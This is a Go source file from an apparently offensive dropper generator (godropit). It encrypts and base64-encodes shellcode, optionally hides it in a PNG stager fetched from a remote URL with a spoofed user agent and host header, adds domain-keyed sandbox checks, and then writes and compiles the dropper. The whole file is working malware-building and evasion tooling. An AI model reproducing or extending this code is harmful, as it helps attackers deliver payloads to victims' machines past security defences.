package gengo

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/kopp0ut/godropit/pkg/box"
	"github.com/kopp0ut/godropit/pkg/dropfmt"

	"github.com/fatih/color"
)

func NewDropper(goDrop Dropper, dropname, domain, input, output, url, img, host, useragent string, sgn bool) {
	/*
		Old code to block non-ms dlls from loading into the process, tbh, not super handy and breaks the payloads unfortunately but can uncomment if you want it.

		if Leet {
			color.Cyan("Note: 1337 Droppers block nonms dlls from loading in the process.\nThis can sometimes break some payloads. Either modify or don't use 1337 mode.")
			goDrop.LeetImp = LeetImports
			goDrop.BlockNonMs = BlockNonMs
			goDrop.MemCom = ""
			dropname = strings.ReplaceAll(dropname, "hunter2", "")
		} else {
			goDrop.LeetImp = ""
			goDrop.BlockNonMs = ""
			goDrop.MemCom = MemCom

		}
	*/
	//Set Debug mode.
	Debug = goDrop.Debug

	goDrop.LeetImp = " "
	goDrop.BlockNonMs = " "
	goDrop.MemCom = MemCom

	var shellcode dropfmt.DropFmt
	if Debug {
		color.Yellow("[gengo] Debug enabled, gengo will save files related to compilation.")
		if goDrop.Arch {
			color.Yellow("[gengo]Arch set to x86, please note this is not supported for all droppers.")
		}
	}

	// if input is CALC, use inbuilt CALC shellcode.
	if input == "CALC" {
		shellcode.Buf = CalcCode
	} else {
		shellcode = GetShellcode(input)
	}
	fmt.Println(dropname)

	//SGN. Not currently in use because it is difficult to import and build this library and I couldn't be bothered.
	if sgn {
		color.Yellow("Shikata Ga Nai encoding shellcode.")
		//shellcode.SGN(archInt)
	}

	//Format Shellcode for dropper.
	_, err := shellcode.AESEncrypt()
	if err != nil {
		log.Fatalf("Error Encrypting shellcode:\n%v\n", err)
	}
	//Prep shellcode.
	goDrop.BufStr = `"` + shellcode.ToB64() + `"`
	goDrop.KeyStr = `"` + shellcode.KeyB64() + `"`
	if Debug {
		//Write shellcode files in case they are needed later.
		scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
		scFile, err := os.Create(scFilepath)
		if err != nil {
			log.Fatalf("Error creating shellcode file: %v ", err)

		}
		scFile.WriteString("ShellcodeKey: " + goDrop.KeyStr + "\n")
		scFile.WriteString("ShellcodeBuf:\n" + goDrop.BufStr)
		scFile.Close()
		binFilepath := filepath.Join(output, dropname+"_Clear.bin")
		fmt.Println(binFilepath)
		binFile, err := os.Create(binFilepath)
		if err != nil {
			log.Fatalf("Error creating shellcode file: %v ", err)

		}
		binFile.Write(shellcode.Buf)
		binFile.Close()

	}

	//Add stager code if url is set.
	if url != "" {
		stagedimage := filepath.Join(output, dropname+"_stager.png")
		createStagerImg(img, shellcode.ToB64(), stagedimage)

		if useragent == "" {
			goDrop.Ua = `ua := "` + defaultagent + `"`
		} else {
			goDrop.Ua = `ua := "` + useragent + `"`
		}

		goDrop.HostHdr = `hostname := "` + host + `"`
		goDrop.Url = `url := "` + url + `"`
		goDrop.Stager = stegStager
		goDrop.StagerImport = stagerImport
		goDrop.StegImport = stegImport
		goDrop.BufStr = "loadImage()"

	}

	// Add domain checks.
	if domain != "" {
		goDrop.Domain = domain
		goDrop.BoxChkFunc = box.DomKeyFunc
		goDrop.BoxChkImp = box.BoxChkImp
		goDrop.ChkBox = box.CheckDom
	} else {
		goDrop.Domain = ""
	}

	//write our dropper template.
	dropfilename := dropname + ".go"
	dropFilepath := filepath.Join(output, dropfilename)
	dropperFile, err := os.Create(dropFilepath)
	if err != nil {
		log.Fatalf("Error creating dropper file: %v ", err)
	}

	//Write the final template
	err = goDrop.writeFinalTemplate(dropperFile)
	if err != nil {
		log.Fatalf("Error writing dropper source:\n%v\n", err)
	}
	dropperFile.Close()
	color.Green("Dropper src written to: %s\n", dropFilepath)

	//generate the build files and
	err = buildInstruct(output, dropfilename, goDrop.Shared, goDrop.Arch)
	if err != nil {
		log.Fatal(err)

	}

	wd, _ := os.Getwd()

	//compile the dropper with the regular go compiler.
	if Leet {
		buildFileGo(output, dropfilename, goDrop.Shared, goDrop.Arch)
	}

	if !Debug {

		err = os.Remove(dropfilename)
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("go.mod")
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("go.sum")
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("goenv.txt")
		if err != nil {
			log.Print(err)
		}
	}

	os.Chdir(wd)

}
